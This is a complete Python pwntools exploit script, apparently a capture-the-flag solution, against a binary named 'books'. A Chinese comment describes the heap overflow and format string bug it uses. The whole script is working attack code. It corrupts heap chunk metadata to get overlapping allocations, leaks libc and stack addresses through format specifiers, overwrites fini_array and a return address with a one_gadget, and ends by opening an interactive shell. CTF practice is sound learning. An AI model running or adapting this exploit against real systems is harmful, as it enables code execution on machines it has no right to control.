# -*- coding: utf-8 -*-
from pwn import *
'''
漏洞：堆溢出，格式化字符串
利用：
1、改堆size，获得一个0x140的释放堆，再申请重叠dest
2、格式化字符串修改fini和ret
'''
#context(log_level='debug')

p = process("./books")
libc = ELF('./libc.so.6')

def edit(order, name):
    p.recvuntil('5: Submit\n')
    p.sendline(str(order))
    p.recvuntil(' order:\n')
    p.sendline(name)


def delete(order):
    p.recvuntil('5: Submit\n')
    p.sendline(str(order + 2))

#gdb.attach(p, "b * 0x400c8e")
fini_array0 = 0x6011B8
main_addr = 0x400A39

payload = "%31$p.%28$p"
payload +="%761d%13$hn"
payload = payload.ljust(0x80, "a")
edit(1, payload+p64(0)+p64(0x151)+"b"*0x140+p64(0)+p64(0x3e1))
delete(2)

p.sendline("5"+"\x00"*7+p64(fini_array0))
p.recvuntil('2: Order 1: ')
p.recvuntil('2: Order 1: ')
libc_start_main_addr = int(p.recv(14), 16) - 240
ret = int(p.recv(15)[1:], 16) - 0xd8 - 0x110
libc_base = libc_start_main_addr - libc.symbols['__libc_start_main']
one_gadget_addr = libc_base+0x45216
log.success('libc base: ' + hex(libc_base))
log.success('ret: ' + hex(ret))
log.success('one_gadget_addr: '+ hex(one_gadget_addr))

k1 = int("0x"+str(hex(one_gadget_addr))[-2:],16)-12
payload = "%"+ str(k1) +"d%13$hhn"
k2 = int("0x"+str(hex(one_gadget_addr))[-6:-2],16)-k1-12
payload += "%"+ str(k2) +"d%14$hn" 
payload = payload.ljust(0x80, "a")
delete(2)

edit(1, payload+p64(0)+p64(0x151))

p.sendline("5"+"\x00"*7+p64(ret)+p64(ret+1))
p.clean()

p.interactive()

